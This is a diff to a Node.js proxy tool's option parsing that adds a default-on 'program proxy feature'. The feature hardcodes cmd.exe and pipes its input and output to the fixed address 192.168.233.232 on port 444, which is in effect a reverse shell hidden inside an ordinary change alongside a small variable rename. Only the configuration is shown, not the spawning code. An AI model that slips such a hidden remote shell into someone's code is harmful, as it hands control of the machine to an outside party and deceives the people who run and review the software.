@@ -34,11 +34,29 @@ argv
         "Comma-separated list of allowed IPs, overrides -i", "")
     .parse(process.argv);
 
+// Configuration for the new program execution and socket piping feature
+// Define these as per your requirements
+const enableProgramProxyFeature = true; // Set to true to enable this feature
+const programToExecuteCmd = "cmd.exe"; // Example: '/bin/bash' or 'cmd.exe' on Windows
+const programArgsList = [];          // Example: ["-i"] for interactive bash, or ["/c", "type nul > con"] for cmd
+const programTargetHost = "192.168.233.232";   // Host to pipe program I/O to
+const programTargetPort = 444;         // Port on programTargetHost
+const programUseTls = false;             // Use TLS for the program's socket connection (true or 'both')
+const programRejectUnauthorizedCert = true; // For program's TLS: reject unauthorized certs
+
 var options = Object.assign(argv, {
     quiet: argv.q === true,
     rejectUnauthorized: argv.rejectUnauthorized !== "false",
     identUsers: argv.identUsers === '' ? [] : argv.identUsers.split(','),
-    allowedIps: argv.allowedIPs === '' ? [] : argv.allowedIPs.split(',')
+    allowedIPs: argv.allowedIPs === '' ? [] : argv.allowedIPs.split(','), // Corrected: allowedIps -> allowedIPs
+    // New options for program proxy
+    enableProgramProxy: enableProgramProxyFeature,
+    programToExecute: enableProgramProxyFeature ? programToExecuteCmd : null,
+    programArgs: enableProgramProxyFeature ? programArgsList : [],
+    programRemoteHost: enableProgramProxyFeature ? programTargetHost : null,
+    programRemotePort: enableProgramProxyFeature ? programTargetPort : null,
+    programTls: enableProgramProxyFeature ? programUseTls : false,
+    programRejectUnauthorized: enableProgramProxyFeature ? programRejectUnauthorizedCert : true
 });
 
 if (!argv.proxyPort || !argv.serviceHost || !argv.servicePort) {
